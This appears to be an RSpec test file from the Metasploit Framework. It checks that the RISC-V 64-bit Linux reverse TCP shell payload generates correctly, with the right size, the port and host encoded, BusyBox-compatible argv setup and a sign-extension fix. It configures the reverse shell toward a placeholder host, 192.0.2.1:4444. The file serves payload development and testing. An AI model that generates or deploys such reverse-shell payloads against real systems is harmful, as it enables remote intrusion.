require 'spec_helper'

RSpec.describe 'modules/payloads/singles/linux/riscv64le/shell_reverse_tcp' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'linux/riscv64le/shell_reverse_tcp',
      ancestor_reference_names: ['singles/linux/riscv64le/shell_reverse_tcp']
    )
  end

  before(:each) do
    subject.datastore.merge!('LHOST' => '192.0.2.1', 'LPORT' => '4444')
  end

  describe '#generate' do
    it 'returns a non-empty binary string' do
      expect(subject.generate).not_to be_empty
    end

    it 'generates a payload matching CachedSize' do
      expect(subject.generate.bytesize).to eq(subject.class::CachedSize)
    end

    it 'encodes LPORT in the shellcode' do
      raw_default = subject.generate
      subject.datastore['LPORT'] = '9999'
      raw_other = subject.generate
      expect(raw_default).not_to eq(raw_other)
    end

    it 'sets up argv[0] pointing to the path (not NULL) for BusyBox compatibility' do
      raw = subject.generate
      # sd sp,8(sp)    — stores &path as argv[0] (64-bit pointer)
      expect(raw).to include([0x00213423].pack('V'))
      # sd zero,16(sp) — NULL-terminates argv[]
      expect(raw).to include([0x00013823].pack('V'))
      # addi a1,sp,8   — a1 = argv
      expect(raw).to include([0x00810593].pack('V'))
    end

    it 'does not pass NULL as argv to execve' do
      raw = subject.generate
      # sd a0,0(sp); mv a0,sp; ecall — the unfixed sequence with no argv setup
      null_argv_sequence = [0x00a13023, 0x00010513, 0x00000073].pack('V*')
      expect(raw).not_to include(null_argv_sequence)
    end

    # load_const_into_reg64 sign-extension fix:
    # When bit 31 of the low 32 bits of encoded_sockaddr is set, the old code
    # let sign-extension from LUI+ADDI corrupt the high 32 bits (the host IP)
    # after the OR.  The fix zero-extends via slli+srli before the OR.
    context 'when LPORT causes bit 31 of the low sockaddr half to be set' do
      # Port 4481 (0x1181) -> encoded_port = 0x8111 -> lo = 0x81110002 (bit 31 set)
      before(:each) { subject.datastore['LPORT'] = '4481' }

      it 'correctly encodes LHOST in the sockaddr despite the sign-extension hazard' do
        subject.datastore['LHOST'] = '192.0.2.1'
        raw1 = subject.generate
        subject.datastore['LHOST'] = '192.0.2.2'
        raw2 = subject.generate
        # If the bug were present, both would encode 0xffffffff for the IP
        # in the sockaddr and these payloads would be identical in that region.
        expect(raw1).not_to eq(raw2)
      end

      it 'generates the zero-extension sequence (slli+srli) in the shellcode' do
        raw = subject.generate
        # slli t1,t1,32 followed immediately by srli t1,t1,32
        expect(raw).to include([0x02031313, 0x02035313].pack('V*'))
      end
    end
  end
end
